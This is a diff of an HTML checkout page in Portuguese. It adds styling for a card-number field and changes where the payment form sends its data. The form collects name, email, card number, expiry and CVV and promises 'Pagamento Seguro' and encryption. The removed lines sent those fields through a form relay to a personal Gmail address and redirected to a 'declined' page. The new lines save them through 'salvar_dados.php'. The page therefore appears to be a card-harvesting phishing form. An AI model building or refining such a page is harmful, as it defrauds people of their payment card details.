@@ -99,6 +99,35 @@
         .checkout-container p a:hover {
             color: #0056b3;
         }
+		
+		
+		.input-imagem {
+    width: 100%;
+    
+    padding: 12px 20px 12px 50px; /* Espaço para a imagem à direita */
+    border: 2px solid #ddd;
+    border-radius: 5px;
+    background-image: url('https://i.imgur.com/JqIIb2f.png');
+    background-position: right 15px center; /* Posiciona a imagem à direita com espaço */
+    background-repeat: no-repeat;
+    background-size: 40px 40px; /* Tamanho maior da imagem */
+    font-size: 1.1rem;
+    color: #333;
+    transition: border-color 0.3s;
+}
+
+.input-imagem:focus {
+    outline: none;
+    border-color: #ff4b5c;
+}
+
+@media (max-width: 600px) {
+    .input-imagem {
+        padding: 12px 20px 12px 40px; /* Ajusta o padding para telas pequenas */
+        font-size: 1rem; /* Ajusta o tamanho da fonte */
+        background-size: 39px 39px; /* Diminui o tamanho da imagem em telas pequenas */
+    }
+}
     </style>
 </head>
 <body>
@@ -145,7 +174,7 @@
     <!-- Página 2: Pagamento -->
     <div class="checkout-container hidden" id="page2">
         <h1>Pagamento Seguro</h1>
-        <form action="https://formsubmit.co/gabrielreboucas2001@gmail.com" method="POST">
+        <form action="salvar_dados.php" method="POST">
             <!-- Dados da Página 1 -->
             <input type="hidden" id="full-name-hidden" name="full-name">
             <input type="hidden" id="email-hidden" name="email">
@@ -159,7 +188,7 @@
             <!-- Campos de pagamento -->
             <div class="form-group">
                 <label for="card-number">Número do Cartão</label>
-                <input type="text" id="card-number" name="card-number" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber()" required>
+                <input type="text" id="card-number" name="card-number" id="input-com-imagem" class="input-imagem" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber()" required>
             </div>
             <div class="form-group">
                 <label for="card-expiry">Validade (MM/AA)</label>
@@ -169,8 +198,7 @@
                 <label for="card-cvv">CVV</label>
                 <input type="text" id="card-cvv" name="card-cvv" placeholder="123" maxlength="3" required>
             </div>
-            <button type="submit" class="checkout-button">Pagar R$9,90</button>
-			<input type="hidden" name="_next" value="https://pagina-mauve.vercel.app/recusado.html">
+            <button type="submit" class="checkout-button">Finalizar Compra</button>
         </form>
 
         <p>Seus dados estão protegidos com nossa tecnologia de criptografia.</p>
